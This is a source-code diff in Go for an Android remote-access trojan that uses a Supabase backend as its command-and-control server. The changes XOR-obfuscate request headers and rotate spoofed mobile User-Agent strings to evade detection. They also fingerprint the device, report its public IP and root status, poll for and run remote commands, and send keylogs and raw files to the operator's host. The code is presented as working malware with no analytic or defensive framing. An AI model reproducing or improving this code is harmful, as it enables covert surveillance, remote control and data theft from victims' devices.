@@ -5,6 +5,7 @@ import (
 	"context"
 	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -30,23 +31,31 @@ var (
 )
 
 // ============================================================
-// XOR STRING OBFUSCATION
+// XOR STRING OBFUSCATION (matches Windows agent)
 // ============================================================
 
-func xorStr(s string) string {
-	b := []byte(s)
-	for i := range b {
-		b[i] ^= xorKey
+var (
+	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34}
+	encAPIKey      = []byte{0x3B, 0x2A, 0x33, 0x31, 0x3F, 0x23}
+	encAuth        = []byte{0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34}
+	encBearer      = []byte{0x18, 0x3F, 0x3B, 0x28, 0x3F, 0x28, 0x7A}
+	encPrefer      = []byte{0x0A, 0x28, 0x3F, 0x3C, 0x3F, 0x28}
+	encUpsert      = []byte{0x28, 0x3F, 0x29, 0x35, 0x36, 0x2F, 0x2E, 0x33, 0x35, 0x34, 0x67, 0x37, 0x3F, 0x28, 0x3D, 0x3F, 0x77, 0x3E, 0x2F, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x3F, 0x29}
+)
+
+func xd(data []byte) string {
+	r := make([]byte, len(data))
+	for i, b := range data {
+		r[i] = b ^ xorKey
 	}
-	return string(b)
+	return string(r)
 }
 
-func xorEnc(s string) string {
-	b := []byte(s)
-	for i := range b {
-		b[i] ^= xorKey
-	}
-	return string(b)
+// User agents for requests
+var userAgents = []string{
+	"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Android 11; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
 }
 
 // ============================================================
@@ -58,6 +67,7 @@ type SupabaseC2 struct {
 	apiKey    string
 	machineID string
 	client    *http.Client
+	mu        sync.RWMutex
 }
 
 type Command struct {
@@ -85,10 +95,15 @@ func (c *SupabaseC2) doRequest(method, path string, body io.Reader, extra map[st
 		if err != nil {
 			continue
 		}
-		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("apikey", c.apiKey)
-		req.Header.Set("Authorization", "Bearer "+c.apiKey)
+		// Use obfuscated headers like Windows agent
+		if body != nil {
+			req.Header.Set(xd(encContentType), "application/json")
+		}
+		req.Header.Set(xd(encAPIKey), c.apiKey)
+		req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
 		req.Header.Set("X-Machine-ID", c.machineID)
+		// Randomize User-Agent
+		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
 		for k, v := range extra {
 			req.Header.Set(k, v)
 		}
@@ -109,11 +124,12 @@ func (c *SupabaseC2) Register(name, user, osInfo, ip string, isAdmin bool) error
 		"ip":           ip,
 		"is_admin":     isAdmin,
 		"last_seen":    time.Now().UTC().Format(time.RFC3339),
+		"created_at":   time.Now().UTC().Format(time.RFC3339),
 	}
 	data, _ := json.Marshal(payload)
-	resp, err := c.doRequest("POST", "/rest/v1/clients", bytes.NewReader(data), map[string]string{
-		"Prefer":              "resolution=merge-duplicates",
-		"on-conflict-columns": "machine_id",
+	// Use same query format as Windows agent
+	resp, err := c.doRequest("POST", "/rest/v1/clients?on_conflict=machine_id", bytes.NewReader(data), map[string]string{
+		xd(encPrefer): xd(encUpsert),
 	})
 	if err != nil {
 		return err
@@ -125,6 +141,8 @@ func (c *SupabaseC2) Register(name, user, osInfo, ip string, isAdmin bool) error
 func (c *SupabaseC2) Heartbeat() {
 	payload := map[string]interface{}{
 		"last_seen": time.Now().UTC().Format(time.RFC3339),
+		"ip":        getPublicIP(),
+		"is_admin":  isRooted(),
 	}
 	data, _ := json.Marshal(payload)
 	resp, err := c.doRequest("PATCH", "/rest/v1/clients?machine_id=eq."+c.machineID, bytes.NewReader(data), nil)
@@ -133,8 +151,25 @@ func (c *SupabaseC2) Heartbeat() {
 	}
 }
 
+func getPublicIP() string {
+	// Try multiple methods
+	methods := []string{
+		"curl -s --max-time 5 https://api.ipify.org 2>/dev/null",
+		"curl -s --max-time 5 https://ifconfig.me 2>/dev/null",
+		"ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1",
+	}
+	for _, cmd := range methods {
+		out, _ := shellExecTimeout(cmd, 10*time.Second)
+		if out != "" && !strings.Contains(out, "error") {
+			return strings.TrimSpace(out)
+		}
+	}
+	return ""
+}
+
 func (c *SupabaseC2) PollCommands() []Command {
-	path := fmt.Sprintf("/rest/v1/commands?or=(machine_id.eq.%s,machine_id.eq.*)&status=eq.pending&order=created_at.asc&limit=10", c.machineID)
+	// Match Windows agent - no limit
+	path := fmt.Sprintf("/rest/v1/commands?or=(machine_id.eq.%s,machine_id.eq.*)&status=eq.pending&order=created_at.asc", c.machineID)
 	resp, err := c.doRequest("GET", path, nil, nil)
 	if err != nil {
 		return nil
@@ -146,6 +181,9 @@ func (c *SupabaseC2) PollCommands() []Command {
 }
 
 func (c *SupabaseC2) UpdateCommand(id, status, result string) {
+	if len(result) > 50000 {
+		result = result[:50000] + "\n...[truncated]"
+	}
 	payload := map[string]interface{}{
 		"status":      status,
 		"result":      result,
@@ -185,20 +223,30 @@ func (c *SupabaseC2) SendKeylog(keys, windowTitle string) {
 }
 
 func (c *SupabaseC2) UploadFile(filename string, data []byte, fileType string) error {
-	payload := map[string]interface{}{
-		"machine_id": c.machineID,
-		"filename":   filename,
-		"data":       base64.StdEncoding.EncodeToString(data),
-		"type":       fileType,
-	}
-	d, _ := json.Marshal(payload)
-	resp, err := c.doRequest("POST", "/functions/v1/file-upload", bytes.NewReader(d), map[string]string{
-		"X-Machine-ID": c.machineID,
-	})
+	// Match Windows agent - send raw binary with headers
+	req, err := http.NewRequest("POST", "https://"+c.domains[0]+"/functions/v1/file-upload", bytes.NewReader(data))
 	if err != nil {
 		return err
 	}
-	resp.Body.Close()
+	req.Header.Set("Content-Type", "application/octet-stream")
+	req.Header.Set(xd(encAPIKey), c.apiKey)
+	req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
+	req.Header.Set("X-Machine-ID", c.machineID)
+	req.Header.Set("X-Filename", filename)
+	req.Header.Set("X-Filepath", "")
+	req.Header.Set("X-Type", fileType)
+	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+
+	resp, err := c.client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	io.ReadAll(resp.Body)
+
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("upload HTTP %d", resp.StatusCode)
+	}
 	return nil
 }
 
@@ -284,17 +332,25 @@ func getProp(key string) string {
 // ============================================================
 
 func getMachineID() string {
-	// Try Android ID
+	// Match Windows agent length (16 hex chars = 8 bytes)
+	var fp strings.Builder
+
+	// Try Android ID first
 	aid, _ := shellExec("settings get secure android_id")
-	if aid != "" && aid != "null" {
-		h := sha256.Sum256([]byte("android-" + aid))
-		return fmt.Sprintf("%x", h[:8])
+	if aid != "" && aid != "null" && len(aid) > 0 {
+		fp.WriteString(aid)
 	}
-	// Fallback: serial + model hash
+
+	// Add serial number
 	serial := getProp("ro.serialno")
+	fp.WriteString(serial)
+
+	// Add model
 	model := getProp("ro.product.model")
-	h := sha256.Sum256([]byte(serial + model))
-	return fmt.Sprintf("%x", h[:8])
+	fp.WriteString(model)
+
+	hash := sha256.Sum256([]byte(fp.String()))
+	return hex.EncodeToString(hash[:8]) // 16 hex chars
 }
 
 // ============================================================
@@ -1033,15 +1089,11 @@ func main() {
 		// Poll commands
 		cmds := c2.PollCommands()
 		for _, cmd := range cmds {
-			c2.UpdateCommand(cmd.ID, "running", "")
+			c2.UpdateCommand(cmd.ID, "executing", "")
 			result, err := handleCommand(c2, jm, cmd)
 			status := "complete"
 			if err != nil {
-				status = "error"
-			}
-			// Truncate result to 50KB
-			if len(result) > 50000 {
-				result = result[:50000] + "\n... (truncated)"
+				status = "failed"
 			}
 			c2.UpdateCommand(cmd.ID, status, result)
 		}
